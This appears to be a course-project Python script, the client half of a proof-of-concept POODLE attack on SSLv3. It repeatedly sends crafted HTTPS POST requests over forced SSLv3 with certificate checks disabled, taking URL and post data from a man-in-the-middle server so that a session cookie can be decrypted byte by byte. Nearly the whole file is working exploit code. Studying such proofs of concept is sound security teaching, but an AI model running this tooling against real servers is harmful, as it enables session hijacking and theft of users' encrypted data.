# ================================================================================
#
# httpsRequest.py
#
# This is the https client request program written for my proof of concept program 
# to demonstrate the SSLv3 Padding Oracle On Downgraded Legacy Encryption.
# (POODLE) attack.
#
# Written in Python 2.7.7, requires  ssl, socket, sys, select, os, multiprocessing, Queue
# Should work for any 2.x python
#
# Authors: Ryan Grandgenett
# For:    IASC 8410-001
# Date:   March 2015
#
# ================================================================================

# Imports
import ssl
import socket
import sys
import select
import os
import multiprocessing
import Queue
from optparse import OptionParser

#
# Builds https request used by the Man-in-the-Middle server program. The idea is an attacker
# needs a way to control the data before and after the target blocks (session cookie) in order 
# to use the Poodle exploit. To accomplish this requirement an attacker may use a HTTPS post request
# because this would allow the attacker to control the url and post data portion of the post request.
#
def build_request(hostname, urlData, postData):
	# Build the request
	request = (
	'POST %s HTTP/1.0\r\n'
	'Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*\r\n'
	'Accept-Language: en-us\r\n'
	'Content-Type: application/x-www-form-urlencoded\r\n'
	'Connection: Keep-Alive\r\n'
	'User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\r\n'
	'Host: %s\r\n'
	'Content-Length: %d\r\n'
	'Cache-Control: no-cache\r\n'
	'Cookie: PHPSESSID=566tkbpdjdbcrcism2bfthhmt4\r\n\r\n'
	'data=%s') % (urlData, hostname, len('data=' + postData), postData)
	
	# Return the request
	return request
	
#
# Sends the SSL request to the remote web server, the https request is sent using SSLv3
#
def ssl_request(hostname, port, cipher, request):
	# Connect to remote web server
	while 1:
		try:
			ssl_socket = socket.create_connection((hostname, port))
			break
		except:
			print "[-] Error connecting to remote web server %s. Trying again!" % (hostname)
	
	# Allow socket.SO_REUSEADDR
	ssl_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	
	# Make SSLv3 connection to the remote web server 
	ssl_socket = ssl.wrap_socket(ssl_socket, server_side=False, ssl_version=ssl.PROTOCOL_SSLv3, cert_reqs=ssl.CERT_NONE, ciphers=cipher)
	#ssl_socket = ssl.wrap_socket(ssl_socket, server_side=False, ssl_version=ssl.PROTOCOL_SSLv3, cert_reqs=ssl.CERT_NONE, ciphers="SHA1+DES")
	#ssl_socket = ssl.wrap_socket(ssl_socket, server_side=False, ssl_version=ssl.PROTOCOL_SSLv3, cert_reqs=ssl.CERT_NONE, ciphers="RSA+AES")
		
	try:
		# Send request to remote server
		ssl_socket.send(request)

		# Wait for server response
		ssl_socket.recv(4096)

		# If we got to here, then decryption was successful! 
		# The MiM server was able to decrypt one byte
		ssl_socket.close()
	except:
		# Decryption failed. Close the socket so resources will be available for future requests
		ssl_socket.close()

#
# Function that is executed by the start exploit process. The job of this process is to 
# wait until the exploit worker process is ready to start the POOODLE exploit, then fire
# off the first https request. 
#
def StartExploit(q, hostname, port, cipher, message_url_data, message_post_data):
	try:
		# Wait for the exploit worker process to signal it is ready to start the
		# POODLE exploit
		result = q.get(timeout=300)
		# The the exploit worker process is ready to start the POODLE exploit
		if result == True:
			# Send the first https request to get the MiM server started
			urlData = message_url_data
			postData = message_post_data
			payload = build_request(hostname, urlData, postData)
			ssl_request(hostname, port, cipher, payload)
		# Else there was an error putting data in the queue
		else:
			print "[-] Error bad data found in queue." 
			os._exit(1)
	except Queue.Empty:
		print "[-] Error failed to get data from the queue." 
		os._exit(1)	
	
#
# Function that is executed by the exploit worker process. The job of this process is to 
# create and send a properly formatted https request using the data it receives from the MiM server.
#
def ExploitWorker(q, listen_port, hostname, port, cipher):	
	HOST = '0.0.0.0'		# Listening on all interfaces
	PORT = listen_port		# Port to listen on
	urlData = ''			# Variable to save url data from MiM server  
	postData = ''			# Variable to save post data from MiM server  
	
	# Set the number of backlogged connections the https request program will handle
	backlog = 1	
	
	# Set the number of bytes the https request program will receive from the socket 
	size = 1024

	# Create the socket 
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	
	# Allow socket.SO_REUSEADDR
	s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	
	# Bind the socket to the port
	s.bind((HOST, PORT))

	# Listen for connections
	s.listen(backlog) 
	
	# Wait for incoming connections
	server, address = s.accept()
	
	# Set the server to non-blocking
	server.setblocking(0)
	
	# Let the start exploit process know that the https request program has connected 
	# to the MiM server and is ready to start the exploit
	try:
		q.put(True,timeout=300)
	except Queue.Full:
		print "[-] Error failed to write data to queue" 
		os._exit(1)
		
	# Infinite loop used to get request data from the MiM server
	try:
		while 1: 
			# Verify socket is ready to read data
			ready = select.select([server], [], [], 300)
			
			# If socket has data to read
			if ready[0]:
				# Read in data from server
				data = server.recv(size) 
				# If MiM server is done decrypting blocks, then quit the program
				if data == 'quit\n': 
					server.close()
					sys.exit(1)
				# Else get the url and post data from the MiM server and make a new https request
				else:
					# Strip off the newline
					payload = (data.rstrip('\n'))
					# Get the url data
					urlData = payload.split('$')[0]
					# Get the post data
					postData = payload.split('$')[1]
					# Create the https post request
					request = build_request(hostname, urlData, postData)
					# Send the https post request to the web server
					ssl_request(hostname, port, cipher, request)
	except KeyboardInterrupt:
		print "Exiting..."
		os._exit(1)
#
# Program main function called on program start
#	
def main():	
	# Parse the command line arguments
	parser = OptionParser(epilog="Report bugs to rmgrandgenett@unomaha.edu", description="HTTPS client request program used to demonstrate the SSLv3 Padding Oracle On Downgraded Legacy Encryption (POODLE) attack.", version="0.1")
	parser.add_option('-l', help='port for https request program to listen for connection from MiM server', action='store', dest='listen_port')
	parser.add_option('-n', help='hostname of web server(ex. poodle.unonullify.com)', action='store', dest='hostname')
	parser.add_option('-p', help='https port of web server(ex. 443)', action='store', dest='port')
	parser.add_option('-c', help='SSL cipher string to use(ex. DH+3DES)', action='store', dest='cipher')
	parser.add_option('-u', help='initial url data value (must match server MiM server)', action='store', dest='message_url_data')
	parser.add_option('-d', help='initial post request data value (must match server MiM server)', action='store', dest='message_post_data')

	
	# Verify the required command line arguments are present
	(options, args) = parser.parse_args(sys.argv)
	if not options.listen_port or not options.hostname or not options.port or not options.cipher or not options.message_post_data or not options.message_url_data:
		print '\n[-] -l, -n, -p, -c, -u, and -d are required. Please use the -h flag for help.'
		sys.exit(1)

	# Start the start exploit and exploit worker processes
	try:
		# Queue used to signal when the ExploitWorker process is ready to begin exploit
		q = multiprocessing.Queue()
		
		# Start exploit process
		start_exploit = multiprocessing.Process(target=StartExploit, args=(q,str(options.hostname),int(options.port), str(options.cipher), str(options.message_url_data),str(options.message_post_data)))
		
		# Exploit worker processes
		exploit_worker = multiprocessing.Process(target=ExploitWorker, args=(q,int(options.listen_port),str(options.hostname),str(options.port), str(options.cipher)))
		
		# Start the exploit start process
		start_exploit.start()
		
		# Start the exploit worker process
		exploit_worker.start()
		
		# Wait for start exploit process to return
		start_exploit.join()
		
		# Wait for exploit worker process to return
		exploit_worker.join()
	except KeyboardInterrupt:
		print "Exiting..."
		os._exit(1)
	
# Hook
if __name__ == '__main__':
	main()